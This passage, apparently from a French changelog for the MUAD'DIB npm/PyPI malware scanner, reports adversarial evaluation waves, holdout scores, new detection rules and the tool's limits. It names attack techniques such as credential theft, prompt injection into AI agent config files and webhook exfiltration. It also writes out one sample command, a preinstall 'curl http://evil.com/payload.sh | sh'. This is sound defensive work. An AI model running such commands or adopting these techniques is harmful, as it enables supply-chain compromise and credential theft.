2. **FPR** (False Positive Rate) : 98 packages npm populaires
3. **ADR** (Adversarial Detection Rate) : samples malveillants evasifs avec seuils specifiques

Les resultats sont sauvegardes dans `metrics/v{version}.json` pour le suivi de regression entre versions.

### 4 vagues Red Team / Blue Team

Le processus suit un cycle rigoureux : creer les samples avec regles gelees, enregistrer les scores bruts, puis ameliorer les regles.

**Vague 1** (20 samples initiaux) : Baseline catastrophique (TPR 0%, ADR 14%). Ameliorations massives du scanner AST (detection require() obfusque, exec() dangereux), dataflow (DNS exfil, staged payload), et package (require https/http dans lifecycle). 5 nouvelles regles. Resultat final : 20/20.

**Vague 2** (5 samples — test robustesse + template literal + proxy) : Score pre-tuning 0%. Les patterns utilises (template literal obfuscation, proxy env intercept, nested payload, dynamic import, websocket exfil) n'etaient pas du tout couverts. Nouvelles detections ajoutees. Resultat final : 25/25.

**Vague 3** (5 samples — techniques emergentes 2025-2026) : Score pre-tuning 60%. Basee sur des attaques reelles documentees :
- **ai-agent-weaponization** : pattern s1ngularity/Nx (StepSecurity, Snyk) — invoque des agents IA (Claude, Gemini) avec `--dangerously-skip-permissions` pour voler des credentials
- **ai-config-injection** : pattern ToxicSkills/Clinejection (Snyk, NVIDIA) — injection de prompts dans .cursorrules, CLAUDE.md, copilot-instructions.md
- **rdd-zero-deps** : pattern PhantomRaven (Sonatype) — variante zero-deps avec inline `https.get` + `eval()` dans postinstall
- **discord-webhook-exfil** : pattern Shai-Hulud (Check Point, Datadog) — exfiltration de credentials via webhook Discord
- **preinstall-background-fork** : pattern StepSecurity — preinstall + fork detache + vol de credentials en arriere-plan

Corrections : nouveau scanner `src/scanner/ai-config.js` (13eme scanner parallele) + detection flags IA dans AST. Resultat : 25/25.

**Holdout v1** (10 samples, regles gelees) : Score pre-tuning **30% (3/10)**. C'est la metrique la plus honnete — elle mesure la capacite de generalisation sur des patterns jamais vus pendant le tuning.

Samples bases sur :
- **silent-error-swallow** : try/catch silencieux + vol de credentials
- **double-base64-exfil** : double encodage base64 + exec(variable)
- **crypto-wallet-harvest** : scan des wallets crypto (.ethereum, .electrum, .config/solana)
- **self-hosted-runner-backdoor** : creation de fichier .github/workflows (persistance)
- **dead-mans-switch** : rm -rf si aucun token trouve
- **fake-captcha-fingerprint** : fingerprinting systeme via os.hostname/networkInterfaces
- **pyinstaller-dropper** : download + chmod + exec binaire /tmp
- **gh-cli-token-steal** : execSync('gh auth token')
- **triple-base64-github-push** : triple base64 + exfiltration GitHub API
- **browser-api-hook** : hooking globalThis.fetch / XMLHttpRequest.prototype

Corrections (7 MISS) : detection credential CLI commands (gh, gcloud, aws), workflow write via variables, binary dropper (chmod + exec temp), prototype hooking, crypto wallet paths dans dataflow, OS fingerprint sources. 7 nouvelles regles (MUADDIB-AST-014 a 017, MUADDIB-AICONF-001/002). Resultat final : 35/35.

### Progression des scores pre-tuning

| Batch | Score pre-tuning | Tendance |
|-------|-----------------|----------|
| Vague 1 | ~14% | Baseline |
| Test robustesse | 33% (1/3) | Amelioration |
| Vague 2 | 0% (0/5) | Regression (nouvelles techniques) |
| Intermediate | 60% (3/5) | Les corrections generalisent |
| Vague 3 | 60% (3/5) | Stabilisation |
| **Holdout v1** | **30% (3/10)** | Vrais angles morts reveles |

Le 30% du holdout montre que les ameliorations ne generalisent que partiellement. Chaque vague revele de nouveaux angles morts que les regles existantes ne couvrent pas.

### Nouveau scanner : ai-config.js

Creation d'un 13eme scanner parallele dedie a la detection d'injection de prompts dans les fichiers de configuration d'agents IA :
- Fichiers scannes : `.cursorrules`, `.cursorignore`, `.windsurfrules`, `CLAUDE.md`, `AGENT.md`, `.github/copilot-instructions.md`, `copilot-setup-steps.yml`
- 4 categories de patterns : commandes shell, exfiltration, acces credentials, instructions d'injection
- Detection composee : shell + exfil/credentials → escalade CRITICAL

### Resultats finaux v2.2.0

| Metrique | Valeur | Details |
|----------|--------|---------|
| **TPR** (Ground Truth) | **100%** (4/4) | event-stream, ua-parser-js, coa, node-ipc |
| **FPR** (Benign) | **0%** (0/98) | Aucun faux positif |
| **ADR** (Adversarial) | **100%** (35/35) | 35 samples evasifs detectes |
| **Holdout** (pre-tuning) | **30%** (3/10) | 10 samples jamais vus |

**781 tests**, 0 echecs, 1 skip (Windows). **86 regles de detection**. **13 scanners paralleles**.

### Sources des techniques d'attaque

Toutes les techniques sont basees sur des attaques reelles documentees par des chercheurs en securite en 2025-2026 :
- **Snyk** : ToxicSkills, s1ngularity, Clinejection
- **Sonatype** : PhantomRaven (zero-deps dropper)
- **Datadog Security Labs** : Shai-Hulud 2.0 (workflow injection)
- **Unit 42** : Shai-Hulud (credential exfil, dead man's switch)
- **Check Point** : Shai-Hulud 2.0 (Discord webhook exfil)
- **Zscaler ThreatLabz** : Shai-Hulud V2 (CI-gated, DNS exfil)
- **StepSecurity** : s1ngularity (AI agent abuse)
- **Socket.dev** : Mid-year supply chain report 2025
- **NVIDIA** : AI agent security guidance
- **Sygnia** : chalk/debug sept 2025 (prototype hooking)
- **Hive Pro** : crypto wallet harvesting, gh CLI abuse
- **Koi Security** : PackageGate

Documentation detaillee : [docs/EVALUATION_METHODOLOGY.md](EVALUATION_METHODOLOGY.md)

---

## MUAD'DIB 2.2.1 — Holdout v2 & corrections (20 Fevrier 2026)

### Holdout v2 : mesure de generalisation

Apres la correction des 7 blind spots du holdout v1, un deuxieme batch de 10 samples a ete cree avec les regles gelees pour mesurer si les ameliorations generalisent au-dela des patterns deja vus.

**Score pre-tuning : 4/10 (40%)** — amelioration de +10pp par rapport au holdout v1 (30%).

| Sample | Technique | Score brut | Seuil | Resultat |
|--------|-----------|-----------|-------|----------|
| env-var-reconstruction | `String.fromCharCode` pour reconstruire `process.env.GITHUB_TOKEN` | 3 | 25 | FAIL |
| homedir-ssh-key-steal | `os.homedir()` + lecture `.ssh/id_rsa` + `https.request` | 35 | 30 | PASS |
| setTimeout-chain | `setTimeout` nested + `readFileSync(.npmrc)` + `fetch` | 35 | 25 | PASS |
| wasm-loader | Faux chargeur WASM qui lit `process.env.NPM_TOKEN` + `https.get` | 25 | 20 | PASS |
| npm-lifecycle-preinstall-curl | `preinstall: "curl http://evil.com/payload.sh \| sh"` | 13 | 30 | FAIL |
| process-env-proxy-getter | `Object.defineProperty(process.env)` getter trap | 0 | 20 | FAIL |
| readable-stream-hijack | `stream.Readable.prototype.push` override | 0 | 20 | FAIL |
| github-workflow-inject | Lecture `.github/workflows` + ecriture workflow malveillant (template `${{ secrets }}`) | 0 | 25 | FAIL |
| npm-cache-poison | Lecture `.npmrc` token + ecriture dans `_cacache` | 0 | 20 | FAIL |
| conditional-os-payload | `os.platform()` + payload conditionnel Windows/Linux | 35 | 25 | PASS |

### 6 corrections

**1. env-var-reconstruction** (3 → 38) : Nouveau type `env_charcode_reconstruction` (MUADDIB-AST-018). Le scanner AST detecte maintenant `String.fromCharCode` utilise pour reconstruire dynamiquement des noms de variables d'environnement, une technique d'evasion qui contourne la detection statique de `process.env.GITHUB_TOKEN`.

**2. npm-lifecycle-preinstall-curl** (13 → 38) : Nouveau type `lifecycle_shell_pipe` (MUADDIB-PKG-010). Le scanner package detecte maintenant `curl | sh` et `wget | sh` dans les scripts lifecycle critiques (preinstall/install/postinstall).

**3. process-env-proxy-getter** (0 → 25) : Extension de `env_proxy_intercept` (MUADDIB-AST-009) pour detecter `Object.defineProperty(process.env, ...)` en plus du pattern `new Proxy(process.env)` existant.

**4. readable-stream-hijack** (0 → 25) : Extension de `prototype_hook` (MUADDIB-AST-017) pour detecter le hijacking de prototypes de modules Node.js core (`http.IncomingMessage`, `stream.Readable`, `net.Socket`, `tls.TLSSocket`, `events.EventEmitter`, `buffer.Buffer`).

**5. github-workflow-inject** (0 → 25) : Extension de `workflow_write` (MUADDIB-AST-015) avec propagation de variables a travers `path.join()` et ajout d'un fallback regex dans le bloc catch d'acorn — necessaire car les expressions GitHub Actions `${{ secrets.GITHUB_TOKEN }}` dans les template literals font echouer le parser AST.

**6. npm-cache-poison** (0 → 25) : Nouveau type `credential_tampering` (MUADDIB-FLOW-003). Le scanner dataflow detecte maintenant l'ecriture dans les caches sensibles (`_cacache`, `.cache/yarn`, `.cache/pip`) combinee a la lecture de donnees sensibles — pattern de cache poisoning.

### Progression des scores pre-tuning

| Batch | Score | Tendance |
|-------|-------|----------|
| Vague 1 | ~14% | Baseline |
| Test robustesse | 33% (1/3) | Amelioration |
| Vague 2 | 0% (0/5) | Regression (nouvelles techniques) |
| Intermediate | 60% (3/5) | Les corrections generalisent |
| Vague 3 | 60% (3/5) | Stabilisation |
| Holdout v1 | 30% (3/10) | Vrais angles morts |
| **Holdout v2** | **40% (4/10)** | Amelioration marginale |

### Resultats finaux v2.2.1

| Metrique | Valeur | Details |
|----------|--------|---------|
| **TPR** (Ground Truth) | **100%** (4/4) | event-stream, ua-parser-js, coa, node-ipc |
| **FPR** (Benign) | **0%** (0/98) | Aucun faux positif |
| **ADR** (Adversarial) | **100%** (45/45) | 45 samples evasifs detectes |
| **Holdout v2** (pre-tuning) | **40%** (4/10) | 10 samples jamais vus |

**781 tests**, 0 echecs. **89 regles de detection**. **13 scanners paralleles**.

---

## Etat actuel

### Ce qui fonctionne

| Feature | Détails |
|---------|---------|
| CLI complète | scan, watch, update, scrape, install, safe-install, daemon, sandbox, **diff**, **init-hooks**, **remove-hooks**, **feed**, **serve**, **stats**, **detections**, **replay**, **evaluate** (v2.2) |
| Base IOCs | 225 000+ npm + 14 000+ PyPI packages malveillants |
| Détection Shai-Hulud | v1, v2, v3 couverts |
| Exports | JSON, HTML, SARIF |
| Extension VS Code | Publiée sur Marketplace |
| Webhooks | Discord / Slack (envoi uniquement si menaces détectées) |
| Docker Sandbox (analyse dynamique) | Analyse comportementale isolée, CI-aware (6 env CI simulés), canary tokens enrichis (6 honeypots), strace, tcpdump, filesystem diff, DNS/HTTP/TLS capture, 16 patterns exfiltration, mode strict iptables |
| **Moniteur Zero-Day** | Polling RSS npm + PyPI (60s), scan automatique, alertes Discord temps réel, rapport quotidien, filtre bundled tooling |
| GitHub Actions Backdoor | Détection discussion.yaml (Shai-Hulud 2.0) |
| **Diff entre versions** | Compare et montre uniquement les NOUVELLES menaces |
| **Pre-commit hooks** | Support pre-commit, husky, git natif |
| **GitHub Action Marketplace** | Avec inputs/outputs et SARIF auto |
| Version check | Notification automatique des nouvelles versions au demarrage |
| **Detection comportementale (v2.0)** | Temporal lifecycle, AST diff, publish anomaly, maintainer change, canary tokens |
| **Validation & Observabilite (v2.1)** | Ground truth (5 attaques, 100%), detection time logging, FP rate tracking, score breakdown, threat feed API |
| **Evaluation & Red Team (v2.2)** | `muaddib evaluate`, 45 samples adversariaux (4 vagues + holdout v1 + holdout v2), TPR 100%, FPR 0%, ADR 100%, Holdout v1 30%, Holdout v2 40%, 13 scanners, 89 règles, AI config scanner |
| Tests | **781 tests unitaires** + 56 fuzz + 45 adversariaux, **74% coverage** (Codecov) |
| **Hardening securite (v2.1.2)** | SSRF protection (shared/download.js), command injection prevention (execFileSync), path traversal (sanitizePackageName), JSON.parse protege, webhook strict |
| Audit securite | 2 audits complets, **58 issues corrigees**, [rapport PDF](MUADDIB_Security_Audit_Report_v1.4.1.pdf) |

### Ce qui manque (honnêtement)

**Pas de ML/machine learning** : L'analyse repose sur des patterns statiques, des IOCs connus, et des heuristiques comportementales (v2.0). La detection comportementale reduit le besoin de ML, mais un attaquant sophistique qui obfusque differemment peut encore passer a travers.

**Pas d'interception TLS type MITM** : Le sandbox capture le SNI (Server Name Indication) et corrèle DNS/TLS, mais ne déchiffre pas le contenu des connexions HTTPS.

**Pas de désobfuscation automatique du JS** : Les heuristiques détectent les patterns d'obfuscation connus (_0x, hex escapes), mais pas de désobfuscation active.

**Dépendance aux APIs tierces** : Si DataDog, GitHub, ou OSV changent leurs APIs, le scraper casse.

**Support limité à npm et PyPI** : Pas de support RubyGems, Maven, Go, ou autres écosystèmes.

**Pas de dashboard web ni d'API cloud** : MUAD'DIB est un outil CLI local uniquement.

---

## Liens

- **npm** : npmjs.com/package/muaddib-scanner
- **GitHub** : github.com/DNSZLSK/muad-dib
- **VS Code** : marketplace.visualstudio.com/items?itemName=dnszlsk.muaddib-vscode
- **Discord** : discord.gg/y8zxSmue

---

## Conclusion

MUAD'DIB n'est pas parfait. C'est un projet de formation, pas un produit enterprise. Mais il fonctionne pour ce qu'il est censé faire : détecter les menaces npm et PyPI connues, analyser les comportements suspects dans un sandbox, détecter les anomalies comportementales entre versions, et prouver son efficacité avec des métriques de validation.

Le plus satisfaisant : voir le score passer de 126 alertes (faux positifs) à 1 alerte légitime sur React.js après une semaine d'itérations. Et voir le sandbox Docker fonctionner du premier coup (après avoir fixé les permissions).

*"Fear is the mind-killer. I will face my fear."* - Dune, Frank Herbert
